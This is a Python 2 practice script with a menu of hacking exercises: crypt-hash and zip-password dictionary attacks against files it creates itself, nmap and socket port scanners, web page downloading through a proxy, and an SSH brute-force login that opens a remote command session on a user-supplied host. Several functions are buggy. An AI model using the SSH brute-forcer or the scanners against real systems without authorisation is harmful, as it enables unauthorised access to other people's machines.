#this file will work on Linux OS, however in order to run it or test it for yourself you will need to:

	# 1. change the lines which include /home/py/Desktop/knowledge_based_test/... swap 'py' with your username
	# 2. create a directory in your desktop called: knowledge_based_test
	# 3. place this file inside of that particular directory
	
import crypt    # done! crypt.crypt; line[0:2] = salt chars e.g. for line in f: salt=line[0:2]; print salt
import zipfile  # done! z = zipfile.ZipFile(zip name); for loop/try/except: z.extractall(zip name, pwd=password) 
import urllib
import nmap	
import socket	 
import os
import time	
from pexpect import pxssh # done!

class option_1_crypt(object):

	''' 
==>   creates a dict.txt with basic passwords, if 'dict.txt' doesn't exist.
==>   creates a directory called crypt_test, if it doesn't exist.
==>   creates a file called crypto.txt, which will salt the word 'hello' if file doesn't exist
	'''

	def __init__(self):
		self.isdir = os.path.isdir('/home/py/Desktop/knowledge_based_test/crypt_test')
		self.isfile = os.path.isfile('/home/py/Desktop/knowledge_based_test/crypt_test/crypto.txt')
		self.isdict = os.path.isfile('/home/py/Desktop/knowledge_based_test/crypt_test/dict.txt')
		self.run = self.initiate()

	def initiate(self):
		if self.isdir:
			print '\'crypt_test\' dir already exists.'
			os.system('cd crypt_test')

		else:
			os.system('mkdir /home/py/Desktop/knowledge_based_test/crypt_test; cd crypt_test')
			print '\'crypt_test\' dir created.'

		if self.isfile:
			f = open('/home/py/Desktop/knowledge_based_test/crypt_test/crypto.txt', 'r')
			print '\'crypto.txt\' file already exists.'

		else:
			f = open('/home/py/Desktop/knowledge_based_test/crypt_test/crypto.txt', 'w')
			f.write(str(crypt.crypt('hello', 'HF')))
			f.close()
			print '\'crypto.txt\' file created.'

		if self.isdict:
			print '\'dict.txt\' file already exists.'
		
		else:
			passwords = ['password\n', 'qwerty\n', 'hello\n', 'cutiepie123\n', 'password123\n']
			f = open('/home/py/Desktop/knowledge_based_test/crypt_test/dict.txt', 'w')
			for words in passwords:
				f.write(words)
			print '\'dict.txt\' file created.'

	def decryptor(self):
			f = open('/home/py/Desktop/knowledge_based_test/crypt_test/crypto.txt', 'r')
			for line in f.readlines():
				salt = line[0:2]
				hashword = line[2:]			

			dict_file = open('/home/py/Desktop/knowledge_based_test/crypt_test/dict.txt', 'r') 
			for pw in dict_file.readlines():
				pwd = pw.strip('\n')
				pwd = crypt.crypt(pwd, salt)
				password = pwd[2:] 
				if password == hashword:
					print 'password found: %s' % pw.strip('\n')
					exit(0)
				else:
					time.sleep(0.5)	


class option_2_zFile(object):
	
	'''
==>    creates a dir named zip_folder
==>    creates a .txt file called random_file.txt
==>    creates a zip file called myZip.zip
==>    adds random_file.txt to myZip.zip
==>    also adds anything with .txt in dir to the myZip.zip
	'''
	def __init__(self):
		self.isdir = os.path.isdir('/home/py/Desktop/knowledge_based_test/zip_folder')
		self.iszip = os.path.isdir('/home/py/Desktop/knowledge_based_test/zip_folder/zips')
		self.isfile = os.path.isfile('/home/py/Desktop/knowledge_based_test/zip_folder/zips/myZip.zip')
		self.isparsefile = os.path.isfile('/home/py/Desktop/knowledge_based_test/zip_folder/zips/random_file.txt')
		self.ispath = os.path.isdir('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip')
		self.crackAzip = os.path.isfile('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip/crack_me.zip')
		self.dictfile = os.path.isfile('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip/zip_dict.txt')
		self.run = self.initiate() 
	
	def initiate(self):
		if self.isdir:
			print '\'zip_folder\' dir already exists.'
	
		else:
			os.system('mkdir zip_folder')
			print '\'zip_folder\' dir created.'


		if self.iszip:
			print '\'zips\' dir already exists'
	
		else:
			os.system('cd zip_folder; mkdir zips')
			print '\'zips\' dir created'

		if self.isfile:
			print '\'myZip.zip\' file already exists.'
			zFile = zipfile.ZipFile('/home/py/Desktop/knowledge_based_test/zip_folder/zips/myZip.zip', 'w')
			f = open('/home/py/Desktop/knowledge_based_test/zip_folder/zips/random_file.txt', 'w')
			f.write('hello world\n')
			f.close()
			self.write_to(zFile)

		else:
			zFile = zipfile.ZipFile('/home/py/Desktop/knowledge_based_test/zip_folder/zips/myZip.zip', 'w')
			print '\'myZip.zip\' folder created.'
			f = open('/home/py/Desktop/knowledge_based_test/zip_folder/zips/random_file.txt', 'w')
			f.write('hello world\n')
			f.close()
			self.write_to(zFile)

	def write_to(self, zip_file):
		if self.isparsefile:
			for path, dirs, files in os.walk('/home/py/Desktop/knowledge_based_test/zip_folder/zips'):
				for items in files:
					#print items
					if '.txt' in items:
						zip_file.write('/home/py/Desktop/knowledge_based_test/zip_folder/zips/%s'%str(items)) 

		else:
			for path, dirs, files in os.walk('/home/py/Desktop/knowledge_based_test/zip_folder/zips'):
				for items in files:
					if '.txt' in items:
						zip_file.write('/home/py/Desktop/knowledge_based_test/zip_folder/zips/%s'%str(items))

	def make_zipCracker(self):
	
		if not self.ispath:
			os.system('cd zip_folder; mkdir crackZip')

		else:
			print '\'crackZip\' dir already exists'

		if not self.crackAzip:
			print 'creating crack_me.zip'
			print '\n'
			f = open('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip/msg.txt', 'w')
			f.write('welldone! you cracked the password!')
			f.close()
			os.system('cd zip_folder/crackZip; zip -e crack_me.zip msg.txt')
			print '\'crack_me.zip\' file created.'
			zipobj = zipfile.ZipFile('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip/crack_me.zip')
			self.crack_the_zip(zipobj)			

		else:
			print '\'crack_me.zip\' file already exists.'
			zipobj = zipfile.ZipFile('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip/crack_me.zip')
			self.crack_the_zip(zipobj)

	def crack_the_zip(self, zFile):

		if not self.dictfile:
			mkdict = ['password\n', '123\n', 'helloworld\n', 'openseseme\n', 'greedy\n', 'fat boy\n', 'hello\n']
			with open('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip/zip_dict.txt', 'a') as f:
				for word in mkdict:
					f.write(word)
				f.close()
				try:
					zFile.extractall('/home/py/Desktop/knowledge_based_test/zip_folder' \
							'/crackZip/cracked_folder', pwd=pw)
					print 'password found: ' + pw

				except:
					pass

		elif self.dictfile:		
			with open('/home/py/Desktop/knowledge_based_test/zip_folder/crackZip/zip_dict.txt', 'r') as f:
				for password in f.readlines():
					pw = password.strip('\n')
					try:
						zFile.extractall('/home/py/Desktop/knowledge_based_test/zip_folder' \
							'/crackZip/cracked_folder', pwd=pw)
						print 'password found: ' + pw

					except:
						pass		

class option_3_urllib(object):

	'''
==>    this class uses urllib to access data from the internet
==>    openpage, is used to copy a website as a html file. its source code could be accessed using cat
==>    download_file allows you to download files from the net. I've only managed to download images
==>    proxy does the same as openpage, using a proxy. the default proxy is probably outdated by now
 
	'''
	def __init__(self):
		self.ispath = os.path.isdir('/home/py/Desktop/knowledge_based_test/URLs')
		self.stdURL = os.path.isdir('/home/py/Desktop/knowledge_based_test/URLs/stdURLs')
		self.download = os.path.isdir('/home/py/Desktop/knowledge_based_test/URLs/url_downloads')
		self.proxypath = os.path.isdir('/home/py/Desktop/knowledge_based_test/URLs/proxyURLs')	
	
	def openpage(self):
		usrInput = str(raw_input('enter a URL: '))

		if 'http://' in usrInput or 'https://' in usrInput:
			open_page = urllib.urlopen(usrInput)
			option = raw_input('would you like to save ' + usrInput + ' to a file? (Y/N): ')
			save_as = str(raw_input('save file name as: '))
			if option == 'Y' or option == 'y':
				if not self.ispath:
					os.system('mkdir URLs')
				else: pass

				if not self.stdURL:
					os.system('cd URLs; mkdir stdURLs')
				else: pass
				
				if not '.html' in save_as:
					f = open('/home/py/Desktop/knowledge_based_test/URLs/stdURLs/%s.html' % save_as, 'w')
					f.write(open_page.read())
					print 'complete.'

				else:
					f = open('/home/py/Desktop/knowledge_based_test/URLs/stdURLs/%s.html' % save_as, 'w')
					f.write(open_page.read())
					print 'complete.'
			else:
				exit(0)

		elif 'www.' not in usrInput and 'http://' or 'https://' in usrInput:
			print '%s invalid format. format options follow:\n' \
			'http://www.example.co.uk\n' \
			'https://www.example.co.uk\n' \
			'www.example.co.uk\n' \
			'example.co.uk' % (usrInput)			
			exit(0)
		
		else:
			website = 'http://' + str(usrInput)
			open_page = urllib.urlopen(website)
			option = raw_input('would you like to save ' + usrInput + ' to a file? (Y/N): ')
			if option == 'Y' or option == 'y':
				if not self.ispath:
					os.system('mkdir URLs')
				if not self.stdURL:
					os.system('cd URLs; mkdir stdURLs')
				save_as = str(raw_input('save file name as: '))
				if '.html' not in save_as:
					file_name = save_as + '.html'
					f = open('/home/py/Desktop/knowledge_based_test/URLs/stdURLs/%s' % file_name, 'w')
					f.write(open_page.read())
					print 'complete.'
					f.close()
				else:
					f = open('/home/py/Desktop/knowledge_based_test/URLs/stdURLs/%s' % save_as, 'w')
					f.write(open_page.read())
					print 'complete.'
					f.close()
			else:		
				exit(0)
			
	def download_file(self):
		if not self.ispath:
			os.system('mkdir URLs')

		if not self.download:
			os.system('cd URLs; mkdir url_downloads')

		url = str(raw_input('enter a valid URL to download a file from: '))
		save_as = str(raw_input('enter a file name to save as: '))
		s = urllib.urlretrieve(url, '/home/py/Desktop/knowledge_based_test/URLs/url_downloads/%s' % save_as)
		print 'file saved as: ' + save_as		
			
			
	def proxy(self):
		print '(format example: 212.332.80.226:8080) [IP address:Port number]'
		prox = raw_input('Enter your proxy here: ')
		my_proxy = { 'http':'http://%s' % prox }
		usrInput = str(raw_input('enter a URL: '))
		
		if 'http://' in usrInput or 'https://' in usrInput:
			open_page = urllib.urlopen(usrInput, proxies=my_proxy)
			option = raw_input('would you like to save ' + usrInput + ' to a file? (Y/N): ')	
			save_as = str(raw_input('save file name as: '))
			if option == 'Y' or option == 'y':
				if not self.ispath:
					os.system('mkdir URLs')
				if not self.proxypath:
					os.system('cd URLs; mkdir proxyURLs')

				if '.html' in save_as:
					f = open('/home/py/Desktop/knowledge_based_test/URLs/proxyURLs/%s' % save_as, 'w')
					f.write(open_page.read())
					print 'complete.'
				else:
					file_name = save_as + '.html'
					f = open('/home/py/Desktop/knowledge_based_test/URLs/proxyURLs/%s' % file_name, 'w')
					f.write(open_page.read())
					print 'complete.'
			
			else:
				exit(0)

		elif 'www.' not in usrInput and 'http://' or 'https://' in usrInput:
			print '%s invalid format. format options follow:\n' \
			'http://www.example.co.uk\n' \
			'https://www.example.co.uk\n' \
			'www.example.co.uk\n' \
			'example.co.uk' % (usrInput)			
			exit(0)

		else:
			website = 'http://' + str(usrInput)
			open_page = urllib.urlopen(website, proxies=my_proxy)
			option = raw_input('would you like to save ' + usrInput + ' to a file? (Y/N): ')
			if option == 'Y' or option == 'y':
				if not self.ispath:
					os.system('mkdir URLs')
				save_as = str(raw_input('save file name as: '))
				if '.html' in save_as:
					f = open('/home/py/Desktop/knowledge_based_test/URLs/proxyURLs/%s' % save_as, 'w')
					f.write(open_page.read())
					print 'complete.'
					f.close()
				else:
					file_name = save_as + '.html'
					f = open('/home/py/Desktop/knowledge_based_test/URLs/proxyURLs/%s' % file_name, 'w')
					f.write(open_page.read())
					print 'complete.'
					f.close()
					
			else:		
				exit(0)

class option_4_nm_scanner(object):

	'''
==> this class uses nmap module to be able to scan target hosts
==> nmS = nmap.PortScanner; nmS.scan(target_addr, port); state=nmS[target_addr]['tcp'][int(port)]['state']
	'''
	def __init__(self):
		self.nmap_folder = os.path.isdir('/home/py/Desktop/knowledge_based_test/nmap_scan/')

	def scanner(self):
		
		ip_addr = raw_input('enter host addr: ')
		port = str(raw_input('enter port(s): '))
		save_opt = raw_input('would you like to save the results? (Y/N): ')
		if save_opt == 'Y' or save_opt == 'y':
			if not self.nmap_folder:
				os.system('mkdir nmap_scan')
			save_as = raw_input('save file name as: ')
			if not '.txt' in save_as:
				f = open('/home/py/Desktop/knowledge_based_test/nmap_scan/%s.txt' % save_as, 'w')
			else:
				f = open('/home/py/Desktop/knowledge_based_test/nmap_scan/%s' % save_as, 'w')

		if ',' in port:
			ports = port.split(',')
			port_range = range(int(ports[0]), int(ports[1]))
			
			for p in port_range:			
				nm_scanner = nmap.PortScanner()
				nm_scanner.scan(ip_addr, str(p))
				state = nm_scanner[ip_addr]['tcp'][p]['state']
				print 'port %s/%s' % (str(p), str(state).upper())
				if save_opt == 'y' or save_opt == 'Y':
					f.write('port %s/%s\n' % (str(p), str(state).upper()))
				else:
					pass


		elif '-' in port:
			ports = port.split('-')
			port_range = range(int(ports[0]), int(ports[1]))
			
			for p in port_range:			
				nm_scanner = nmap.PortScanner()
				nm_scanner.scan(ip_addr, str(p))
				state = nm_scanner[ip_addr]['tcp'][p]['state']
				print 'port %s/%s' % (str(p), str(state).upper())
				if save_opt == 'y' or save_opt == 'Y':
					f.write('port %s/%s\n' % (str(p), str(state).upper()))
				else:
					pass

		elif ' ' in port:
			ports = port.split(' ')
			port_range = range(int(ports[0]), int(ports[1]))
			
			for p in port_range:			
				nm_scanner = nmap.PortScanner()
				nm_scanner.scan(ip_addr, str(p))
				state = nm_scanner[ip_addr]['tcp'][p]['state']
				print 'port %s/%s' % (str(p), str(state).upper())
				if save_opt == 'y' or save_opt == 'Y':
					f.write('port %s/%s\n' % (str(p), str(state).upper()))
				else:
					pass

		else:
			nm_scanner = nmap.PortScanner()
			nm_scanner.scan(ip_addr, port)	
			state = nm_scanner[ip_addr]['tcp'][int(port)]['state']
			print 'port %s/%s' % (ip_addr, str(state).upper())
			if save_opt == 'y' or save_opt == 'Y':
				f.write('port %s/%s\n' % (str(p), str(state).upper()))
			else:
				pass


class option_5_socket(object):
	'''
==> this class entails of a local socket port scanner
==> and constructs a local chat server
==> [!!!] chat server is incomplete and requires lots of work
==> [!!!] client server is incomplete and requires lots of wor
==> this class methods include a port scanner method, chat_server method and client server method
 
	'''

	def __init__(self):
		self.sock_scan = os.path.isdir('/home/py/Desktop/knowledge_based_test/sock_scan')

	def Local_port_scanner(self):

		port = raw_input('enter port[s]: ')
		target = raw_input('enter target host: ')

		target_host = socket.gethostbyname(target)
		target_name = socket.gethostbyaddr(target_host)
		print 'searching in: %s' % str(target_name[0])
		time.sleep(3)

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		save_opt = raw_input('would you like to save the results? (Y/N): ')
		if save_opt == 'Y' or save_opt == 'y':
			if not self.sock_scan:
				os.system('mkdir sock_scan')
			save_as = raw_input('save file name as: ')
			if not '.txt' in save_as:
				f = open('/home/py/Desktop/knowledge_based_test/sock_scan/%s.txt' % save_as, 'w')
			else:
				f = open('/home/py/Desktop/knowledge_based_test/sock_scan/%s' % save_as, 'w') 							
		if ',' in port:
			ports = port.split(',')
			port_range = range(int(ports[0]), int(ports[1]))
			for p in port_range:
				try:		
					conn = s.connect((target, int(p)))
					print 'port %s/OPEN' % str(p)
					if save_opt == 'y' or save_opt == 'Y':
						f.write('port %s/OPEN\n' % str(p))
					else:
						pass
				except:
					print 'port %s/CLOSED' % str(p)
					if save_opt == 'y' or save_opt == 'Y':
						f.write('port %s/CLOSED\n' % str(p))
					else:
						pass
		elif '-' in port:
			ports = port.split('-')
			port_range = range(int(ports[0]), int(ports[1]))
			for p in port_range:		
				try:		
					conn = s.connect((target, int(p)))
					print 'port %s/OPEN' % str(p)
					if save_opt == 'y' or save_opt == 'Y':
						f.write('port %s/OPEN\n' % str(p))
					else:
						pass

				except:
					print 'port %s/CLOSED' % str(p)
					if save_opt == 'y' or save_opt == 'Y':
						f.write('port %s/CLOSED\n' % str(p))
					else:
						pass

		else:
			try:
				conn = s.connect((target, int(port)))
				print 'port %s/OPEN' % str(port)
				if save_opt == 'y' or save_opt == 'Y':
						f.write('port %s/OPEN\n' % str(p))
				else:
					pass

			
			except:
				print 'port %s/CLOSED' % str(port)
				if save_opt == 'y' or save_opt == 'Y':
						f.write('port %s/CLOSED\n' % str(p))
				else:
					pass

class option_6_ssh(object):

	def __init__(self):
		self.px      = os.path.isdir('/home/py/Desktop/knowledge_based_test/px')
		self.pwf     = os.path.isfile('/home/py/Desktop/knowledge_based_test/px/passwords.txt')
		self.start   = self.details()

	def details(self):
		addr = raw_input('enter ip addr: ')
		usr = raw_input('enter user name: ')
		return addr, usr

	def cmd(self):
		command = str(raw_input('enter a command: '))
		return command

	def try_ssh(self):
		print self.run[0], self.run[1]
		passwd = raw_input('enter password: ')
		s = pxssh.pxssh()
		s.login(self.start[0], self.start[1], passwd)
		while True:
			run = self.cmd()
			if run == 'q' or run == 'Q':
				break
			else:
				s.sendline(run)
				s.prompt()
				print s.before

	def break_in(self):
		if not self.px:
			os.system('mkdir px')

		if not self.pwf:
			pass_list = ['hello\n', 'hi\n', 'a\n', 'i\n', 'lol\n', 'crap\n', 'I\n', 'like\n', 'python\n']
			f = open('/home/py/Desktop/knowledge_based_test/px/passwords.txt', 'w')
			for word in pass_list:
				f.write(word)
			f.close()

		with open('/home/py/Desktop/knowledge_based_test/px/passwords.txt', 'r') as f: 				
			for word in f.readlines():
				try_pw = word.strip('\r\n')
				try:
					s = pxssh.pxssh()
					s.login(self.start[0], self.start[1], try_pw)	
					print 'password found:', word.strip('\n')

					usr = raw_input('would you like to load a session? (Y/N): ')
					if usr == 'Y' or usr == 'y':
						while True:
							run = self.cmd()
							if run == 'q' or run == 'Q':
								break
							else:
								s.sendline(run)
								s.prompt()
								print s.before
					elif usr == 'N' or usr == 'n':
						break
						exit()
					else:
						break
						exit()		
				except: 
					print 'trying:', try_pw			

def Main():
	print ''' ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ 
||K |||N |||O |||W |||L |||E |||D |||G |||E |||       |||T |||E |||S |||T ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|
		'''
	
	options_choice = ['crypt', 'zipfile', 'urllib', 'nmap', 'socket', 'pxssh']
	count = 1
	for choice in options_choice:	
		print str(count) + '- ' + choice 
		count += 1

	user_input = int(raw_input('\nenter number command: '))
	if user_input == 1:
		selected_crypt = option_1_crypt()
		usrInput = raw_input('would you like to run decryptor method to find password? (Y/N): ')
		if usrInput == 'Y' or usrInput == 'y':		
			selected_crypt.decryptor()
		else:
			exit(0)

	elif user_input == 2:
		selected_zipfile = option_2_zFile()
		usrInput = raw_input('would you like to execute crackAzip? (Y/N): ')
		if usrInput == 'Y' or usrInput == 'y':
			selected_zipfile.make_zipCracker()
		else:
			exit(0)	

	elif user_input == 3:
		selected_urllib = option_3_urllib()
		print '(1) download a file (2) use a proxy (3) standard web opener'
		option = int(raw_input('enter a number option: '))
		if option == 1:
			selected_urllib.download_file()
		elif option == 2:
			selected_urllib.proxy()
		elif option == 3:
			selected_urllib.openpage()
		else:
			print 'incorrect input. next time try \'1\' \'2\' or \'3\''

	elif user_input == 4:
		selected_nmap = option_4_nm_scanner()
		selected_nmap.scanner()

	elif user_input == 5:
		selected_socket = option_5_socket()
		selected_socket.Local_port_scanner()

	elif user_input == 6:
		selected_ssh = option_6_ssh()
		print '(1) standard login (2) brute-force login'
		option = int(raw_input('enter a number option: '))
		if option == 1:
			selected_ssh.try_ssh()
		elif option == 2:
			selected_ssh.break_in()

if __name__ == '__main__':
	Main()
